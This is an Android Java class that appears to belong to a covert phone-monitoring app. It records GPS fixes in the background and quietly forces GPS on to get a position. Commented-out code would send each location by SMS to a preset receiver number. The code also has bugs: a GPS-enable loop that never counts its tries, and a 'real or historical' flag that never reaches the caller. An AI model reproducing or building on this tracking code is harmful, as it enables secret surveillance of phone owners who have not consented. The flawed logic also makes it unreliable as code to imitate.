package system.service.feature.location;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import system.service.SmsReceiver;
import system.service.activity.GlobalPrefActivity;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.SysUtils;

import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class LocationUtil 
{
	private static final String LOGTAG = "GpsUtil";
	private static final int DEFAULT_INTERVAL = 60000; // ms
	private static final float DEFAULT_DISTANCE = 0; // meter
	private static final int DEFAULT_TRY_COUNT = 10;
	private static final int SLEEP_TIME = 5000; // ms
	
	private Context context;
	private LocationManager locationManager = null;
	private LocationListener locationListener = null;
	private LinkedList<Location> locationQueue;
	private static final int MAX_QUEUE_LEN = 100;
	
	public static final String REALPOSITION = "real";
	public static final String HISTPOSITION = "hist";
	
	public boolean sentSMS = false;
	
	public LocationUtil(Context context) {
		this.context = context;
		locationQueue = new LinkedList<Location>();
		//locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
		//if (locationManager != null) {
			//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
			//locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
		//}
		try {
			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
			locationListener = new LocationListener() {
				@Override
				public void onLocationChanged(Location location) {
					if (location != null) {
						addLocation(location);
						
						//if (sentSMS) return;
						
						//if (tryToEnableGPS) { 
						//	GpsUtil.disableGPS(context);
						//}
						
			    		//locationManager.removeUpdates(locationListener);
							
						//String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
						//String locationSms = SmsCtrl.buildLocationSms(context, location, LocationUtil.REALPOSITION);
						//boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
						//if (ret) sentSMS = true;
		            }
				}

				@Override
				public void onProviderDisabled(String provider) {
					
				}

				@Override
				public void onProviderEnabled(String provider) {
					//updateLocation(provider);
				}

				@Override
				public void onStatusChanged(String provider, int status, Bundle extras) {
					//if (status != LocationProvider.AVAILABLE) return;
					//updateLocation(provider);
				};
			};
			locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 0, locationListener);
		} catch (Exception ex) {
			
		}
	}
	
	public void destroy() {
		if (locationManager != null) {
			locationManager.removeUpdates(locationListener);
		}
	}
	
	
	private void updateLocation(String provider) 
	{
		try {
			if (locationManager == null) return;
            
            Criteria criteria = new Criteria();
            criteria.setAccuracy(Criteria.ACCURACY_FINE);
            criteria.setAltitudeRequired(false);
            criteria.setBearingRequired(false);
            criteria.setCostAllowed(true);
            //criteria.setPowerRequirement(Criteria.POWER_LOW);

            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) 
            {
            	Location location = null;
            	int tryCount = 0;
            	while (location == null && tryCount < DEFAULT_TRY_COUNT) {
            		tryCount++;
            		SysUtils.threadSleep(2000, LOGTAG);
            		location = locationManager.getLastKnownLocation(provider);
            	}
            	
            	if (location != null) {
            		addLocation(location);
            		
            		//if (sentSMS) return;
					
					//if (tryToEnableGPS) { 
					//	GpsUtil.disableGPS(context);
					//}
					
		    		//locationManager.removeUpdates(locationListener);
						
					//String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
					//String locationSms = SmsCtrl.buildLocationSms(context, location, LocationUtil.REALPOSITION);
					//boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
					//if (ret) sentSMS = true;
            	}
            }
        } catch (Exception e) {
            Log.e(LOGTAG, e.getMessage());
        }
	}
	
	
	private void addLocation(Location location) {
        if (this.locationQueue == null) return;
        if (this.locationQueue.size() >= MAX_QUEUE_LEN) this.locationQueue.poll();
        this.locationQueue.offer(location);
    }
	
	// If return is not null and it is realtime position, realOrHistorical = "real"
	// If return is not null and it is historical position, realOrHistorical = "hist"
	public Location getLocation(String realOrHistorical)
    {		
		if (locationManager == null) return null;
		
		// If GPS is not enabled, try to enable it
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context)) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < DEFAULT_TRY_COUNT) {
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
			if (tryToEnableGPS) SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
		}
		
		// Start to get location
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);
		criteria.setAltitudeRequired(false);
		criteria.setBearingRequired(false);
		criteria.setCostAllowed(true);
		
		String provider = "";
		if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
			provider = LocationManager.GPS_PROVIDER;
		} else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
			provider = LocationManager.NETWORK_PROVIDER;
		}
		
		// If cannot get any provider, return a historical location.
		if (provider.length() <= 0) {
			if (this.locationQueue.size() == 0) {
				return null;
			} else {
				realOrHistorical = HISTPOSITION;
				return this.locationQueue.getLast();
			}
		}
		
		// If provider is available
        try {
        	Location loc = null;
        	int tryCount = 0;
        	while (loc == null && tryCount < DEFAULT_TRY_COUNT*3) {
        		tryCount++;
        		loc = locationManager.getLastKnownLocation(provider);
        		SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
        	}
        	
        	// If GPS previously forced to be enabled, try to disable it
    		if (tryToEnableGPS) {
    			GpsUtil.disableGPS(context);
    		}

        	// If cannot get any location, return a historical location.
        	if (loc == null) {
    			if (this.locationQueue.size() == 0) {
    				return null;
    			} else {
    				realOrHistorical = HISTPOSITION;
    				return this.locationQueue.getLast();
    			}
        	}
        	// Return location
        	else return loc;
        	
        } catch (Exception ex) {
        	Log.e(LOGTAG, ex.getMessage());
        	return null;
        }
		
    }
}
